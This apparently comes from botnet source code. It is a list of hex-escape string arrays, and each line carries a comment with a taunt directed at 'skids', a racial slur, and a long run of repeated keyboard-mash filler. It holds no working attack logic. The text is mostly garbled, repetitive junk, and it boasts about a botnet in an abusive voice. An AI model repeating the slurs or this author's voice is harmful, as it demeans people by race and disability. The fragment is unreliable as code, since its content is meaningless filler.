    "\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x11","\x12","\x13","\x14","\x15","\x16","\x17",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x1f","\x20","\x21","\x22","\x23","\x24","\x25",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x34","\x35","\x36","\x37","\x38","\x39","\x3a",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x42","\x43","\x44","\x45","\x46","\x47","\x48",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFA